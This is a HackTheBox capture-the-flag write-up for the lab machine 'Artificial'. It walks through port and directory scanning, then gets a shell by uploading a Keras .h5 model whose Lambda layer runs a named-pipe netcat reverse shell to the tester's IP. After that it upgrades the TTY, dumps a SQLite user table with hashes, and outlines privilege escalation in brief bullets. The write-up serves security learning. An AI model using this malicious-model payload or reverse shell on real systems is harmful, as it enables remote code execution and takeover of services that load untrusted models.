+++
title = 'HackTheBox: Artificial'
date = 2025-09-02T08:17:12-04:00
draft = false
+++
---------------------------------------
<details open>

<summary style="cursor:pointer; color:#8a2be2; font-size:1.4em; font-weight:bold; text-shadow:0 0 5px #8a2be2;">Reconnaissance</summary>



### Port Scan



```bash

rustscan -a 10.10.11.74 -- -A | tee rustscan.log

Open 10.10.11.74:22

Open 10.10.11.74:80

```



### Identify Target and Add to Hosts File



```bash

URL: http://10.10.11.74

```



Upon visiting the IP in a browser, we are redirected to:

		
		
```
	
http://artificial.htb

```



Add this domain to `/etc/hosts`:



```bash

sudo nano /etc/hosts

10.10.11.74 artificial.htb

```



### Web Enumeration



* Login and registration pages:

  [http://artificial.htb/login](http://artificial.htb/login)

  [http://artificial.htb/register](http://artificial.htb/register)



* Notes:



> Artificial is a platform that lets you easily build, test, and deploy AI models to solve real-world problems like sales forecasting.



### Directory Scan Using ffuf



```bash

ffuf -u http://artificial.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt

```



Results:



```

/login         [Status: 200]

/register      [Status: 200]

/logout        [Status: 302]

/dashboard     [Status: 302]

```



</details>



<details>

<summary style="cursor:pointer; color:#8a2be2; font-size:1.4em; font-weight:bold; text-shadow:0 0 5px #8a2be2;">Initial Access</summary>



### Registration



Register a new user at `/register`:



![Register page](artificialregister.png)



### Login



Login using the credentials at `/login`:



![Login page](artificiallogin.png)



### Exploit: Malicious .h5 Upload



```python

import tensorflow as tf



def exploit(x):

    import os

    os.system("rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.93 6666 >/tmp/f")

    return x



model = tf.keras.Sequential()

model.add(tf.keras.layers.Input(shape=(64,)))

model.add(tf.keras.layers.Lambda(exploit))

model.compile()

model.save("exploit.h5")

```



Upload `exploit.h5`:



![Upload model](artificialuploadmodel.png)



### Listener



```bash

nc -lvnp 6666

```



### Trigger Shell



Click on view predictions:



![View predictions](viewpredicitons.png)



Get TTY:



```bash

python3 -c 'import pty; pty.spawn("/bin/bash")'

[Ctrl+Z]

stty raw -echo; fg

export TERM=xterm

```



</details>



<details>

<summary style="cursor:pointer; color:#8a2be2; font-size:1.4em; font-weight:bold; text-shadow:0 0 5px #8a2be2;">Post Exploitation</summary>



### Enumerate .db files



```bash

find / -name "*.db*" 2>/dev/null

sqlite3 /home/app/app/instance/users.db

```



Tables:



```sql

.tables

SELECT * FROM user;

```



Example:



```

1|gael|gael@artificial.htb|HASH

6|whoameye|whoameye@gmail.com|5f4dcc3b5aa765d61d8327deb882cf99

```



Login as Gael:



```bash

su - gael

cat ~/user.txt

```



Confirm container:



```bash

hostname

cat /etc/hosts

find / -name container 2>/dev/null

```



### Host Enumeration



* Search for backups

* Exfiltrate backup

* Analyze `backrest` files

* Crack passwords



### Privilege Escalation



* Add repo and run backup

* Dump snapshot files

* Root obtained



![Root obtained](fcde9198-a3ae-4ca9-a6cf-29a22afc115d.png)



</details>



<details>

<summary style="cursor:pointer; color:#8a2be2; font-size:1.4em; font-weight:bold; text-shadow:0 0 5px #8a2be2;">Final Notes</summary>



That wraps up my first HackTheBox writeup.

Hope you learned something new!



Happy hacking, 0xD3f3c7



</details>
